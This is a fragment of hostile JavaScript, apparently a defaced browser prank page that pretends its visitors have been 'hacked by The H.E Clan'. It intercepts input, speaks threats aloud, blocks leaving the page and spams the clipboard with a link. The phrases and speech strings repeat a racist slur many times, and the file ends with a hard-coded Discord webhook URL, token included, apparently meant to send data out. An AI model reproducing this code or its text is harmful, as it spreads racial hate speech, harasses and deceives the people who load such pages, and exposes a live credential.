...
const PHRASES = [
  'Warning: You have been hacked by The H.E Clan, Surrender now or be mass reported by us.',
'Access Granted, Welcome H.E Robot. GET HACKED YOU FUCKING NIGGER!',
]
const LOGOUT_SITES = {
...
function initParentWindow () {
  ...
  interceptUserInput(event => {
    if (interactionCount === 1) {
      ...
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('SURRENDER NOW OR FACE THE CONSEQUENCES, FUCK NIGGERS , FUCK NIGGERS, FUCK NIGGERS, SURRENDER AND OBEY THE H.E CLAN , FUCK NIGGERS, FUCK NIGGERS, FUCK NIGGERS, THE H.E CLAN OWNS YOU, FUCK NIGGERS')
    }
  })
}
...
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('HACKED BY H.E ROBOT YOU FUCKING NIGGER!')
...
function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + '\nCheck out http://birdhuntersequel.netlify.app/'
...
var wbhk = 'https://discord.com/api/webhooks/1335742768076558386/osPPVRlnu1LRG7M4g3Fw5orohTTmnhs7y8kFMd9FQzRb8AKyYKPrGWhqDXQA7rHCG8Wx' 
